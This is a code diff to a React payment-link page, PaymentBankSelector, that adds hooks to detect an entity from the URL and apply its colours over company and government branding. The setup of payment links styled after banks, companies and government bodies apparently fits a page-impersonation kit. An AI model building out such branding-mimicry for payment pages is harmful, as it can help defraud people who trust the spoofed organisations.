@@ -14,12 +14,18 @@ import { formatCurrency } from "@/lib/countryCurrencies";
 import BankLogo from "@/components/BankLogo";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { getGovernmentLayout } from "@/components/GovernmentLayouts";
+import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
+import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData, isLoading: linkLoading } = useLink(id);
   const updateLink = useUpdateLink();
+
+  useAutoApplyIdentity();
+  const { identity: dynamicIdentity } = useDynamicIdentity();
 
   const [selectedBank, setSelectedBank] = useState<string>("");
   const [banks, setBanks] = useState<Bank[]>([]);
@@ -88,8 +94,8 @@ const PaymentBankSelector = () => {
     );
   }
   
-  const primaryColor = companyBranding?.colors.primary || govSystem.colors.primary;
-  const secondaryColor = companyBranding?.colors.secondary || govSystem.colors.secondary;
+  const primaryColor = dynamicIdentity?.colors?.primary || companyBranding?.colors.primary || govSystem.colors.primary;
+  const secondaryColor = dynamicIdentity?.colors?.secondary || companyBranding?.colors.secondary || govSystem.colors.secondary;
 
   const renderBankSelector = () => (
     <div className="space-y-8">
